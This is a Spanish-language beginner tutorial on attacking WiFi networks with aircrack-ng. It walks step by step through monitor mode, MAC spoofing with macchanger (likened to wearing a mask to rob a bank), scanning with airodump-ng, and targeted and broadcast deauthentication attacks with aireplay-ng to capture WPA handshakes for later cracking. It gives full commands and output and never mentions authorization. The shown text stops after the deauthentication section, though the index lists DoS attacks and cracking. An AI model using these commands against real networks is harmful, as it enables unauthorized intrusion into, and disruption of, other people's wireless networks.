---
title: Hacking Wi-Fi para Principiantes
published: true
---


---
En este espacio abordaremos el tema del hacking de redes WiFi para principiantes. Esto incluye desde los conceptos básicos sobre cómo se compone una red inalámbrica, como qué es un AP, un BSSID, una dirección MAC, hasta técnicas de ataque a redes inalámbricas y encubrimiento de direcciónes mac. Todo será guiado y explicado paso a paso.

---

<link rel="icon" href="https://www.kali.org/tools/aircrack-ng/images/aircrack-ng-logo.svg">


# Índice
- <a href="#fundamentos-básicos" style="text-decoration: none;">Fundamentos básicos</a>
	- <a href="#términos-básicos" style="text-decoration: none;">Términos básicos</a>
	- <a href="#comandos-básicos" style="text-decoration: none;">Comandos básicos</a>
- <a href="#instalación-de-aircrack-ng" style="text-decoration: none;">Instalación de Aircrack-ng</a>
- <a href="#encubrimiento-de-dirección-mac" style="text-decoration: none;">Encubriemiento de dirección MAC</a>
- <a href="#usó-de-la-herramienta" style="text-decoration: none;">Usó de aircrack-ng</a>
	- <a href="#qué-es-un-handshake" style="text-decoration: none;">¿Qué es un Handshake?</a>
	- <a href="#tipos-de-ataques" style="text-decoration: none;">Tipos de Ataques con aireplay-ng</a>
		- <a href="#ataque-de-deautenticación-dirigido" style="text-decoration: none;">Ataque de deautenticación dirigido</a>
		- <a href="#ataque-de-deautenticación-global" style="text-decoration: none;">Ataque de deautenticación global</a>
		- <a href="#ataque-de-autenticación" style="text-decoration: none;">Ataque de autenticación</a>
- <a href="#instalación-de-mdk4" style="text-decoration: none;">Instalación de mdk4</a>
	- <a href="#tipos-de-ataques-con-mdk4" style="text-decoration: none;">Tipos de Ataques con mdk4</a>
		- <a href="#authentication-dos-mode" style="text-decoration: none;">Authentication DoS mode attack</a>
		- <a href="#beacon-flood-mode-attack" style="text-decoration: none;">Beacon flood mode attack</a>
		- <a href="#disassociation-amok-mode-attack" style="text-decoration: none;">Disassociation amok mode attack</a>
		- <a href="#michael-shutdown-explotation" style="text-decoration: none;">Michael shutdown explotation</a>
- <a href="#técnicas-pasivas" style="text-decoration: none;">Técnicas pasivas</a>
- <a href="#instalación-de-tshark" style="text-decoration: none;">Instalación de Tshark</a>
	- <a href="#filtración-de-paquetes-con-tshark" style="text-decoration: none;">Filtración de paquetes con Tshark</a>
- <a href="#validación-y-verificación-del-handshake" style="text-decoration: none;">Validación y verificación del Handshake</a>
	- <a href="#instalación-de-pyrit" style="text-decoration: none;">Instalación de pyrit</a>
		- <a href="#usó-de-pyrit" style="text-decoration: none;">Usó de pyrit</a>
- <a href="#crackeo-de-handshakes" style="text-decoration: none;">Crackeo de Handshakes</a>
	- <a href="#crackeo-con-aircrack-ng" style="text-decoration: none;">Crackeo con Aircrack-ng</a>
	- <a href="#crackeo-con-john-the-ripper" style="text-decoration: none;">Crackeo con John The Ripper</a>
	- <a href="#crackeo-con-hashcat" style="text-decoration: none;">Crackeo con Hashcat</a>
 

## Fundamentos básicos
---
En este apartado les mostraré los **fundamentos básicos** que existen en las redes inalámbricas, los cuales nos servirán para mucho más adelante y para usar la herramienta Aircrack-ng. Aquí explicaré, por ejemplo, qué es un **AP**, un **BSSID**, un **ESSID**, etc.

---

## Términos básicos

**AP** (**Acces Point**)

Un **AP**, o punto de acceso en español, es un dispositivo que permite la conexión de dispositivos a una red local, lo que también nos permite conectarnos a Internet. Se le puede conocer como módem-router, pero no necesariamente tiene que ser eso; por ejemplo, un repetidor también puede funcionar como un AP.

<img src="https://esemanal.mx/revista/wp-content/uploads/2016/08/guia330-2.jpg" alt="Imágen de un AP" width="100%" height="400px">

**ESSID**

El **ESSID** (**Extended Service Set Identifier**) es, en pocas palabras, el nombre del punto de acceso (**AP**). Es un término sencillo, pero más adelante será muy útil para los ataques que realizaremos con Aircrack.

**Dirección MAC**

Una dirección **MAC** (**Media Access Control**) nos permite identificar a un dispositivo dentro de una red local. Esta dirección es única para cada interfaz de red de cada dispositivo. Más adelante, les explicaré cómo se compone una dirección **MAC**.

<img src="https://db0dce98.rocketcdn.me/es/files/2024/07/Direccion-MAC-1024x512.png" alt="Imágen de una direcciób MAC" width="100%" height="400px">

**BSSID**

El **BSSID** (**Basic Service Set IDentifier**) no es más que la dirección MAC del AP. Como les dije, cualquier dispositivo que se pueda conectar a la red tiene una dirección MAC, lo que equivale a que tiene una interfaz de red. Esta llamada BSSID se utilizará más adelante para usar la herramienta Aircrack-ng; quédense con que es la MAC del AP.

**Interfaz de Red**

La interfaz de red, o tarjeta de red, permite conectar dispositivos como laptops, celulares y tabletas a una red inalámbrica. Estas interfaces suelen estar integradas, pero también se pueden agregar adaptadores externos. Algunos nombres comunes son wlan0, wlan1, ath0 etc.

**Modo monitor**

El modo monitor está relacionado con la interfaz de red, ya que es esta la que se pone en dicho modo. ¿Qué implica el modo monitor? Cuando nuestra interfaz está en modo monitor, puede capturar todo el tráfico de las redes locales a nuestro alrededor. Este modo será muy útil más adelante.

## Comandos básicos

---
En esta sección, les mostraré todos los comandos básicos que necesitamos conocer y su función, para que luego podamos utilizarlos. Por supuesto, estos comandos los veremos más adelante en la práctica. ¡Comencemos con algunos de ellos!

---

El comando `ifconfig` sirve para listar las interfaces de red disponibles. Nos ayuda a seleccionar una de ellas para poner en modo monitor. Por ahora, nos enfocaremos en la interfaz wlan0, que es la que viene por defecto en mi sistema, aunque como mencioné antes, pueden tener nombres diferentes.

Verás algo así:

```bash
[root@arch ~]# ifconfig
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10234  bytes 8901234 (8.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10234  bytes 8901234 (8.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::b2b4:d4ff:fe5e:5f67  prefixlen 64  scopeid 0x20<link>
        inet6 2806:2f0:4460:2001:b2b4:d4ff:fe5e:5f67  prefixlen 64  scopeid 0x0<global>
        ether b0:b4:d4:5e:5f:67  txqueuelen 1000  (Ethernet)
        RX packets 65432  bytes 76345230 (72.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32100  bytes 12456789 (11.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Instalación de Aircrack-ng

---
Ahora les mostraré cómo instalar esta fantástica herramienta con la cual haremos auditorías de redes inalámbricas. Tengamos en cuenta que esta "herramienta" no es más que una suite de herramientas; Aircrack tiene consigo misma más herramientas dentro, como **airmon-ng** o **airodump-ng**. Con solo instalar Aircrack, ya vienen instaladas por defecto. Ahora pasemos a la instalación.

---

**Para distros basadas en debian/ubuntu**

```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install aircrack-ng 
```

**Para distros basadas en arch-linux**

```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S aircrack-ng
```

## Encubrimiento de dirección MAC

---
Bueno, antes de poder realizar auditorías a redes inalámbricas con Aircrack, necesitaremos encubrir nuestra dirección MAC. Si hacemos estas auditorías con nuestra MAC original, no tiene mucho sentido, ya que sería lo mismo que ir a robar a un banco sin máscara o pasamontañas. Suena lógico, ¿no? Bueno, esa es la idea.

---

Primero que nada, tengo que enseñarles cómo está compuesta una dirección MAC antes de cambiarla, ya que es muy importante y obligatorio.

<img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2018/10/que-es-direccion-mac-tu-ordenador-movil-que-sirve.jpg?tf=3840x" alt="Imágen de la composición de una dirección MAC" width="100%" height="300px">

El **OUI** (**Organizationally Unique Identifier**) son los primeros 24 bits o 6 dígitos en hexadecimal. Esta parte de la dirección MAC es un identificador único que identifica al fabricante del dispositivo de red y te permite distinguir entre diferentes fabricantes.

El **UAA** (**Universally Administered Address**) son los otros 24 bits o 6 dígitos en hexadecimal de la dirección MAC. Esta parte permite diferenciar entre diferentes dispositivos de un mismo fabricante.

Ahora si, vamos con la instalación de la herramienta

**Para distros basados en debian/ubuntu**
```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install macchanger
```

**Para distros basadas en arch-linux**
```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S macchanger
```

Ahora que ya hemos instalado la herramienta, es momento de aprender a usarla. Primero que nada, necesitamos tener la tarjeta de red a la que le vamos a cambiar la dirección MAC en modo monitor. Ya les había explicado qué es este modo monitor, pero nunca les dije cómo activarlo. Para activarlo, necesitamos una de las herramientas de la suite de Aircrack. Por ahora, solo les explicaré cómo activar el modo monitor, así de simple, porque necesitamos ese modo. Después les explicaré con más profundidad.

**Activar el modo monitor**
```bash
[root@arch ~]# sudo airmon-ng start wlan0
```

¿Se acuerdan de la tarjeta de red? Bueno, aquí es donde la necesitamos para activar este modo monitor, así que acuérdense de escribir `ifconfig` y ver cuál es su tarjeta de red.

Con `ifconfig` verificamos si nuestra interfa está en modo monitor.

```bash
[root@arch ~]# ifconfig
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10234  bytes 8901234 (8.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10234  bytes 8901234 (8.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 63  bytes 12032 (11.7 KiB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

###### Algo que me comentaba decirles es que, cuando ponemos nuestra interfaz de red en modo monitor, nuestra interfaz suele cambiar de nombre. Lo más habitual es que se le agregue el "mon" de monitor al nombre de nuestra interfaz.

Bueno, después de activar el modo monitor y verificar que está correcto que está en modo monitor, lo siguiente será bajar la interfaz para poder cubrir la dirección MAC. Y algo más: si se dieron cuenta, al poner nuestra interfaz en modo monitor nos empieza a desconectar de la red. Bueno, esto es normal, no se asusten. La mayoría de los ataques que nosotros haremos serán offline.

**Bajar la interfaz de red**
```bash
[root@arch ~]# sudo ifconfig wlan0mon down
```

Después de bajar la red, necesitamos usar la herramienta que recién acabamos de instalar; así es, hablamos de **macchanger**. ¿Cómo la usamos? Tranquilos, la propia herramienta tiene disponibles miles y miles de OUI's, que es lo primero que vamos a cambiar en nuestra dirección MAC. ¿Recuerdan? Son los primeros 24 bits, o si prefieren, 6 dígitos en hexadecimal. Bueno, sigamos.

**Listar las OUI's disponibles**
```bash
[root@arch ~]# macchanger -l
```

Con el comando `macchanger -l` listamos los OUI's que la herramienta tiene disponibles para nosotros. La herramienta tiene miles y miles de OUI's, así que nuestra idea será encontrar una que nos agrade y después de ello seguir al siguiente paso.

Así se vería el output:

```bash
[root@arch ~]# macchanger -l
Misc MACs:
Num    MAC        Vendor
---    ---        ------
0000 - 00:00:00 - XEROX CORPORATION
0001 - 00:00:01 - XEROX CORPORATION
0002 - 00:00:02 - XEROX CORPORATION
0003 - 00:00:03 - XEROX CORPORATION
0004 - 00:00:04 - XEROX CORPORATION
0005 - 00:00:05 - XEROX CORPORATION
0006 - 00:00:06 - XEROX CORPORATION
0007 - 00:00:07 - XEROX CORPORATION
0008 - 00:00:08 - XEROX CORPORATION
0009 - 00:00:09 - XEROX CORPORATION
0010 - 00:00:0a - OMRON TATEISI ELECTRONICS CO.
0011 - 00:00:0b - MATRIX CORPORATION
0012 - 00:00:0c - CISCO SYSTEMS, INC.
0013 - 00:00:0d - FIBRONICS LTD.
0014 - 00:00:0e - FUJITSU LIMITED
0015 - 00:00:0f - NEXT, INC.
0016 - 00:00:10 - SYTEK INC.
0017 - 00:00:11 - NORMEREL SYSTEMES
0018 - 00:00:12 - INFORMATION TECHNOLOGY LIMITED
0019 - 00:00:13 - CAMEX
```

Si lo sé, son muchas, ¿no? Pues esto solo es el comienzo, así que tenemos muchas para seleccionar o elegir. Después de que hayan seleccionado su OUI, a continuación será crear/cambiar la dirección MAC de nuestra interfaz. Aunque solo la encubriremos por un lapso temporal, ya que nuestra MAC original siempre permanece. Esto es solo temporal, así que aprovechemos para usarla solo para lo que es.

**Cambio de dirección MAC**
```bash
[root@arch ~]# sudo macchanger --mac=00:20:91:AF:24:11 wlan0mon
```
Aquí es cuando seleccionamos el **OUI** y el **UAA**. Primero pusimos los 24 bits del OUI. ¿Y el UAA? Normalmente, puedes poner cualquier cosa; puede ser inventado, pero debe estar basado en formato hexadecimal.

**Levantar la interfaz de red**
```bash
[root@arch ~]# sudo ifconfig wlan0mon up
```

**Verificar nuestra dirección MAC**
```bash
[root@arch ~]# macchanger -s wlan0mon
Current MAC:   00:20:91:af:24:11 (J125, NATIONAL SECURITY AGENCY)
Permanent MAC: 00:11:22:33:44:55 (arch)
```

Como vemos en el output, dice "current MAC" y "permanent MAC". Bueno, la "permanent MAC" es, como es obvio, nuestra MAC original. Recuerden que esto es temporal. Bueno, ahí lo tenemos: hemos cambiado nuestra dirección MAC temporalmente.


## Usó de aircrack-ng

----
 Aquí les muestro el uso de esta maravillosa herramienta para hacer auditorías en redes inalámbricas. Les mostraré más a fondo todo, por ejemplo, el modo monitor, cómo listar las redes inalámbricas a nuestro alrededor, sus tipos de ataques, etc. Todo en esta sección.

----

Empecemos activando el **modo monitor**, que es lo primordial; sin esto, no hay nada. Ya les había comentado en la sección de términos básicos qué era el modo monitor. Bueno, brevemente, el modo monitor es un modo en el que ponemos nuestra interfaz de red para que sea capaz de visualizar los paquetes que circulan por el aire o el tráfico de las redes inalámbricas cercanas.

**Activando modo monitor**
```bash
[root@arch ~]# sudo airmon-ng start wlan0
```

**Listar redes cerca de nosotros**

Para listar las redes inalámbricas que se encuentran cerca de nosotros, usamos la herramienta **airodump-ng**, que es parte de la propia suite de herramientas de **Aircrack**. ¿Qué hace este comando? Bueno, nos lista las redes inalámbricas cercanas junto a otros datos que ahorita les explicaré. También les ayudaré a interpretar el output y algunos otros términos que nos servirán para más adelante.

```bash
[roo@arch ~]# sudo airodump-ng wlan0mon
 CH  6 ][ Elapsed: 8 s ][ 2024-11-04 15:20 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 12:34:56:AB:CD:1A  -85        3        7    1   8   -1   WPA              <length:  0>                                              
 11:22:33:AA:BB:4C  -75        1        0    0   9  150   WPA2 CCMP   PSK  MYNETWORK_2.4                                      
 D0:9E:51:F7:33:44  -80        5        0    0   6  150   WPA2 CCMP   PSK  NETWORK_A                                             
 E0:E1:FE:E7:5B:70  -70        8        0    0   4  150   WPA2 CCMP   PSK  NETWORK_B                                             
 58:23:89:F5:A1:F0  -82        4        0    0   5  150   WPA2 CCMP   PSK  NETOWORK                                             
 A1:87:56:DB:22:F1  -90        6        0    0  11  150   WPA2 CCMP   PSK  PRIVATE_NET                                           
 B0:DE:76:40:A9:55  -80        5        0    0  11  150   WPA2 CCMP   PSK  MY_ROUTER                                               
 5E:FF:68:6E:70:85  -75        2        0    0   3  300   WPA2 CCMP   PSK  <length:  0>                                              
 A1:12:6F:EC:73:58  -65       15        0    0   2  180   WPA2 CCMP   PSK  MY_NETWORK_5G                                         
 64:EA:88:32:8B:4D  -75        4        0    0   7  250   WPA2 CCMP   PSK  <length:  0>                                              
 B1:93:75:F1:5C:6B  -85        3        0    0   7  400   OPN              TP-LINK_NEW                                            
 AC:4C:A5:D9:C5:90  -70        6        0    0   1  180   WPA2 CCMP   PSK  ISP_NETWORK                                               
 C8:6F:54:30:55:B9  -80        6        0    0   1  300   WPA2 CCMP   PSK  OFFICE_NETWORK                                          
 B8:E8:1E:25:9F:F0  -45       14        0    0   1  150   WPA2 CCMP   PSK  INFINITUM_NEW                                            
 15:E7:95:73:D4:9B  -50       12        0    0   8  150   WPA2 CCMP   PSK  <length:  0>                                              
 15:E7:95:73:D4:90  -52       10      200    0   7  150   WPA2 CCMP   PSK  testwifi                                                         

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 15:E7:95:73:D4:90  11:AB:AF:8B:BA:53   -1    1 - 0      0        4                                                                   
 15:E7:95:73:D4:90  29:67:B0:FE:B9:5D  -25   18e-18e   300      200
```

Este es el output. No se espanten, sé que son muchos datos, pero yo les explicaré qué datos son más importantes y para qué sirven.

Empezando por el campo llamado **BSSID**, ya les había explicado qué era en la sección de términos básicos. Bueno, esto no es más que la dirección MAC del AP. El **ESSID**, como tal, también les había explicado qué era; este dato es el nombre del **AP**.

Ahora, el **PWR**. Vemos que los números suelen ser negativos. La idea es que, mientras más cerca esté el número negativo de cero, más cerca estamos del AP; y si se aleja más de cero, es porque estamos lejos del AP.

El campo **CH** indica el canal donde se encuentra el AP. Normalmente, el rango de canales es del 1 al 12. Supongamos que nuestro AP está en el canal 5. La mayoría de los APs deberían estar dispersos sobre los canales, ya que concentrarlos puede dañar el espectro de onda. Un ataque se basa en esto: la idea es crear falsos APs en un canal específico para dejar inoperativa una red, pero esto lo mostraré más adelante.

Por otra parte, tenemos los campos **ENC**, **CIPHER** y **AUTH**, donde podemos verificar con qué tipo de red estamos tratando. La mayoría de las redes inalámbricas cumplen con la encriptación **WPA**/**WPA2**, utilizando cifrado CCMP y el modo de autenticación **PSK**.

Si son observadores, tenemos una subdivisión en la parte inferior. Si es así, se preguntarán: ¿qué es? Bueno, esta sección corresponde a los clientes conectados. Seguimos viendo el campo **BSSID**, pero ahora vemos uno nuevo: la **STATION**. Este dato muestra la dirección MAC del dispositivo. Vemos que el BSSID concuerda con el **ESSID** o **AP** llamada 'testwifi'. Lo lógico es que este dispositivo esté conectado a esta AP.

Ahora bien, ya habiendo mostrado los campos más importantes del output después de ejecutar el comando `airodump-ng wlan0mon`, les mostraré cómo usar esta misma herramienta pero con una especie de filtro para poder filtrar el AP que nosotros queremos y ver el tráfico de esa red específica, así como los paquetes. ¿Cómo podemos filtrar? Bueno, gracias a que la herramienta nos proporciona parámetros para filtrar, por ejemplo, por canal, **BSSID**, **ESSID**, etc.

**Modos de filtro**

Ahora les enseñaré cómo usar la herramienta airodump para filtrar y seleccionar una red objetivo, y así poder visualizar el tráfico que circula en ella.

Volviendo al caso anterior:

```bash
 CH  6 ][ Elapsed: 8 s ][ 2024-11-04 15:20 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 12:34:56:AB:CD:1A  -85        3        7    1   8   -1   WPA              <length:  0>                                              
 11:22:33:AA:BB:4C  -75        1        0    0   9  150   WPA2 CCMP   PSK  MYNETWORK_2.4                                      
 D0:9E:51:F7:33:44  -80        5        0    0   6  150   WPA2 CCMP   PSK  NETWORK_A                                             
 E0:E1:FE:E7:5B:70  -70        8        0    0   4  150   WPA2 CCMP   PSK  NETWORK_B                                             
 58:23:89:F5:A1:F0  -82        4        0    0   5  150   WPA2 CCMP   PSK  NETOWORK                                             
 A1:87:56:DB:22:F1  -90        6        0    0  11  150   WPA2 CCMP   PSK  PRIVATE_NET                                           
 B0:DE:76:40:A9:55  -80        5        0    0  11  150   WPA2 CCMP   PSK  MY_ROUTER                                               
 5E:FF:68:6E:70:85  -75        2        0    0   3  300   WPA2 CCMP   PSK  <length:  0>                                              
 A1:12:6F:EC:73:58  -65       15        0    0   2  180   WPA2 CCMP   PSK  MY_NETWORK_5G                                         
 64:EA:88:32:8B:4D  -75        4        0    0   7  250   WPA2 CCMP   PSK  <length:  0>                                              
 B1:93:75:F1:5C:6B  -85        3        0    0   7  400   OPN              TP-LINK_NEW                                            
 AC:4C:A5:D9:C5:90  -70        6        0    0   1  180   WPA2 CCMP   PSK  ISP_NETWORK                                               
 C8:6F:54:30:55:B9  -80        6        0    0   1  300   WPA2 CCMP   PSK  OFFICE_NETWORK                                          
 B8:E8:1E:25:9F:F0  -45       14        0    0   1  150   WPA2 CCMP   PSK  INFINITUM_NEW                                            
 15:E7:95:73:D4:9B  -50       12        0    0   8  150   WPA2 CCMP   PSK  <length:  0>                                              
 15:E7:95:73:D4:90  -52       10      200    0   7  150   WPA2 CCMP   PSK  testwifi                                              
```

Bueno, ¿**qué necesitamos para filtrar o enfocarnos en una red específica**? Antes que nada, tenemos que observar y ver cuál es la red o el objetivo. Una vez que estén seguros de cuál es su red objetivo, deben tomar algunos datos de esa red para filtrarla con **airodump-ng**, en mi caso mi red objetivo es testwifi.

* El **AP** se sitúa en el canal 7
* El **AP** posee una essid la cual es testwifi
* El **AP** tambien posee uan dirección MAC

Con estos datos no es mas que suficiente, algo asi se vería:

* ```bash
[root@arch ~]# sudo airodump-ng -c 7 --bssid 15:E7:95:73:D4:90 wlan0mon
```
* ```bash
[root@arch ~]# sudo airodump-ng -c 7 --essid testwifi wlan0mon
```
* ```bash
[root@arch ~]# sudo airodump-ng -c 7 --essid testwifi --bssid 15:E7:95:73:D4:90 wlan0mon
```

**Exportando información**

Ahora, una vez que tengamos una red objetivo, la hayamos filtrado y estemos viendo el tráfico, es importante aclarar que solo estaremos observando el tráfico por el momento. No vamos a exportar la información aún; nos falta ver el modo de filtrado adecuado para capturar toda esa información.

Bueno, **airodump-ng** tiene un parámetro que nos permite exportar toda la información recolectada a una serie de archivos. Este parámetro es `-w`, y así es como se vería:

```bash
[root@arch ~]# sudo airodump-ng -c 7 --bssid 15:E7:95:73:D4:90 -w captura wlan0mon
```
Ahora si estaremos exportando toda esa informacion correctamente

```bash
[root@arch ~]# ls
captura-01.cap  captura-01.csv  captura-01.kismet.csv  captura-01.kismet.netxml  captura-01.log.csv
```
Estos son los archivos típicos que nos genera **airodump-ng** después de capturar toda la información. Sí, son muchos archivos, pero no se preocupen, ya que solo trabajaremos con uno específicamente: el archivo `captura-01.cap`. Más adelante, ese archivo nos será útil. Por ahora, concéntrense en capturar bien el tráfico de la red.

### ¿Qué es un Handshake?

---
Aquí explicaremos qué es un handshake. Brevemente, el handshake es la contraseña encriptada de la red inalámbrica. Este llamado handshake se obtiene cuando un cliente de la red inalámbrica se conecta o reconecta al punto de acceso (**AP**), generando así el handshake. Nuestra misión será capturar ese handshake para poder crackearlo despues.

---

¿**Y cómo podemos obtenerlo**? Se preguntarán. La forma más común sería esperar a que un cliente se reconecte o a que un nuevo cliente se conecte a la red. Sin embargo, no necesariamente tenemos que esperar. A estos casos se les llama **escenarios pasivos**, pero existen otros métodos para obtener el handshake más rápidamente.

También existen los **escenarios activos**, que son aquellos en los que utilizamos las herramientas proporcionadas por la suite de Aircrack-ng para forzar la reconexión de un cliente. Para esto, empleamos los diversos ataques que nos ofrece la misma suite.

### Tipos de ataques

---
Por parte del atacante, tenemos múltiples tipos de ataques, como el ataque de deautenticación, de falsa autenticación, entre otros. Nuestra única idea es utilizar cualquier tipo de ataque que nos permita reconectar al cliente y capturar el handshake. A continuación, les mostraré los diferentes tipos de ataques disponibles.

---

La misma herramienta tiene su panel de ayuda, donde te muestra los tipos de ataques y algunos consejos. Para ver este panel, puedes escribir el siguiente comando:

```bash
[root@arch ~]# aireplay-ng --help
--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

### Ataque de deautenticación dirigido

Este ataque consiste en, dentro de la red objetivo, tener un cliente listo para ser deautenticado, lo que hará que se reconecte y así obtener el handshake. Esta es la idea: ahora que ya estamos en la red objetivo y observamos que hay clientes, utilizaremos la herramienta **aireplay**, que es parte de la suite de **Aircrack-ng**, para llevar a cabo este ataque.

Bueno, sigamos. Nos quedamos en que estamos analizando el tráfico de la red objetivo. En este punto, deberían encontrarse listos para continuar con el siguiente paso.

```bash
CH  7 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 15:E7:95:73:D4:90  -26 100       29        7    3   7  180  WPA2 CCMP   PSK  testwifi                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 15:E7:95:73:D4:90  34:41:5D:46:D1:38  -26    0e- 6e     0        9  
```
##### Les quería comentar también que es importante considerar dejar monitoreando al AP objetivo en otra terminal, porque la misma herramienta te indica cuando se haya generado un handshake. Más adelante les mostraré cuando se muestra.

A continuación, enviamos el ataque de deautenticación, que consiste en mandar paquetes de deautenticación al cliente dentro de la red inalámbrica para que este se desconecte y se vuelva a conectar, generando así el handshake.

```bash
[root@arch ~]# sudo aireplay -0 0 -a 15:E7:95:73:D4:90 -c 34:41:5D:46:D1:38 wlan0mon
```
Ahora expliquemos esto. El `-0` indica el tipo de ataque que haremos, o sea, el ataque de deautenticación, y el otro **0** que lo acompaña indica que no queremos que el ataque se detenga hasta que nosotros lo paremos. Normalmente, este parámetro indica la cantidad de paquetes a enviar. Ahora, el `-a` sirve para ingresar el **BSSID** del **AP** y el `-c` indica la dirección **MAC** de la estación (**también llamada cliente**). Y por último, pero no menos importante, nuestra tarjeta de red en modo monitor.

```bash
CH  7 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 15:E7:95:73:D4:90  -28 100     3564      684    2   7  180  WPA2 CCMP   PSK  testwifi                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probe                                                                                                             
 15:E7:95:73:D4:90  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  EAPOL  testwifi
```

Vemos que en la parte superior derecha aparece algo llamado **WPA handshake**. Esto significa que ya hemos generado el handshake de manera medianamente correcta. Más adelante veremos cómo verificar si el handshake se generó correctamente, pero por ahora podemos gritar victoria. Hemos logrado que el cliente se desconecte a la fuerza, forzándolo a reconectarse y, de esta manera, generando el handshake.

### Ataque de deautenticación global

Bueno, una vez aclarado el ataque de desautenticación dirigido, este nuevo ataque no se aleja mucho del anterior. Nuestra idea con este ataque es poder **desautenticar globalmente**, en pocas palabras, a todos los **clientes**/**estaciones** que se encuentren en un **AP**/**red inalámbrica**, para así tener mayor eficiencia al obtener el **handshake** usando la **Broadcast MAC address**

Es casi igual que el ataque de desautenticación dirigido, solo que esta vez, para realizar el ataque global, debemos especificar la **Broadcast MAC address** como cliente o estación de la propia red. Esta se representa de la siguiente forma: **FF:FF:FF:FF:FF:FF**.

Así obteniendo el handshake:

```bash
[root@arch ~]# sudo aireplay-ng -0 10 --bssid 15:E7:95:73:D4:90 -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 7
Found BSSID "15:E7:95:73:D4:90" to given ESSID "testwifi".
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
```

De igual manera, hay otra forma de efectuar este ataque y a mi gusto es más fácil; en esta forma no hay que especificar ni una dirección mac. De alguna estación objetivo, solo los datos básicos como bssid, tipo de ataque y interfaz de red, a continuación de esta forma:

```bash
[root@arch ~]# sudo aireplay -0 0 -a 15:E7:95:73:D4:90 wlan0mon
21:11:46  Waiting for beacon frame (ESSID: testwifi) on channel 7
Found BSSID "15:E7:95:73:D4:90" to given ESSID "testwifi".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
